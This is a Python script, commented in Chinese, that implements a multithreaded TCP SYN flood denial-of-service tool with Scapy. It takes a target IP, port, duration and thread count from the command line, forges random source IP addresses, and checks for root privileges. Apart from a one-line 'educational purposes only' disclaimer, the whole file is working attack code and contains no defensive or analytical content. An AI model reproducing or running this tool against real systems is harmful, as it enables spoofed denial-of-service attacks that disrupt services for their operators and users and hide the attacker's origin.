#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
DDoS Attack Tool Scapy Extension
使用Scapy库实现更高级的TCP SYN洪水攻击

仅供教育目的使用。
"""

import sys
import time
import random
import threading
import os
from scapy.all import IP, TCP, Raw, send

def is_root():
    """检查当前用户是否拥有root/管理员权限"""
    if os.name == 'nt':  # Windows
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    else:  # Unix/Linux/MacOS
        return os.geteuid() == 0

def check_privileges():
    """检查是否有足够权限运行Scapy，如果没有则给出提示"""
    if not is_root():
        print("[!] 警告: Scapy SYN攻击需要root/管理员权限")
        print("[*] 在macOS/Linux上，请使用 'sudo python3 ddos_attack.py' 运行")
        print("[*] 在Windows上，请以管理员身份运行命令提示符")
        return False
    return True

def randomize_ip():
    """生成随机的源IP地址"""
    ip = ".".join(map(str, (random.randint(1, 255) for _ in range(4))))
    return ip

def syn_flood(target, port, duration, spoofed=True, verbose=False):
    """
    使用Scapy实现TCP SYN洪水攻击
    
    参数:
        target: 目标IP地址
        port: 目标端口
        duration: 攻击持续时间(秒)
        spoofed: 是否使用伪造的源IP地址
        verbose: 是否显示详细信息
    """
    timeout = time.time() + duration
    sent = 0
    
    while time.time() < timeout:
        try:
            if spoofed:
                source_ip = randomize_ip()
            else:
                source_ip = None  # Scapy将使用实际的IP地址
            
            # 生成随机的源端口
            source_port = random.randint(1024, 65535)
            
            # 生成随机的序列号
            seq = random.randint(1000000000, 2000000000)
            
            # 构造IP和TCP头
            if source_ip:
                ip_packet = IP(src=source_ip, dst=target)
            else:
                ip_packet = IP(dst=target)
            
            tcp_packet = TCP(sport=source_port, dport=port, flags="S", seq=seq, window=random.randint(1000, 65535))
            
            # 发送数据包
            send(ip_packet/tcp_packet, verbose=False)
            sent += 1
            
            if verbose and sent % 100 == 0:
                sys.stdout.write(f"\r[+] 已发送 {sent} 个TCP SYN包")
                sys.stdout.flush()
        
        except Exception as e:
            if verbose:
                error_msg = str(e)
                if "Permission denied" in error_msg:
                    print(f"\n[!] 权限错误: {error_msg}")
                    print("[!] Scapy需要root/管理员权限才能发送原始数据包")
                    print("[*] 在macOS上可能会看到 'could not open /dev/bpf0' 错误")
                    return sent
                else:
                    print(f"\n[!] 发送失败: {error_msg}")
            # 短暂休息，避免CPU过载
            time.sleep(0.1)
    
    return sent

def start_scapy_syn_flood(target, port, duration, threads=10, spoofed=True, verbose=True):
    """
    启动多线程Scapy TCP SYN洪水攻击
    
    参数:
        target: 目标IP地址
        port: 目标端口
        duration: 攻击持续时间(秒)
        threads: 线程数
        spoofed: 是否使用伪造的源IP地址
        verbose: 是否显示详细信息
    """
    # 首先检查权限
    if not check_privileges():
        if verbose:
            print("[!] 由于权限不足，Scapy攻击可能无法正常工作")
            choice = input("是否继续尝试? (y/n): ")
            if choice.lower() != 'y':
                raise PermissionError("需要root/管理员权限运行Scapy")
    
    if verbose:
        print(f"[*] 开始Scapy TCP SYN洪水攻击")
        print(f"[*] 目标: {target}:{port}")
        print(f"[*] 持续时间: {duration}秒")
        print(f"[*] 线程数: {threads}")
        print(f"[*] 使用伪造IP: {'是' if spoofed else '否'}")
    
    thread_list = []
    total_sent = 0
    
    start_time = time.time()
    
    # 创建并启动线程
    for i in range(threads):
        thread = threading.Thread(
            target=syn_flood,
            args=(target, port, duration, spoofed, i == 0 and verbose)
        )
        thread_list.append(thread)
        thread.daemon = True
        thread.start()
    
    # 等待所有线程完成
    for thread in thread_list:
        thread.join()
    
    end_time = time.time()
    elapsed_time = end_time - start_time
    
    if verbose:
        print(f"\n[*] 攻击完成")
        print(f"[*] 攻击持续时间: {elapsed_time:.2f}秒")
    
    return total_sent, elapsed_time

if __name__ == "__main__":
    # 简单的命令行测试
    if len(sys.argv) < 4:
        print(f"用法: {sys.argv[0]} <目标IP> <目标端口> <持续时间> [线程数]")
        sys.exit(1)
    
    # 检查权限
    if not check_privileges():
        choice = input("由于权限不足，攻击可能无法正常工作。是否继续? (y/n): ")
        if choice.lower() != 'y':
            sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])
    threads = int(sys.argv[4]) if len(sys.argv) > 4 else 10
    
    start_scapy_syn_flood(target, port, duration, threads) 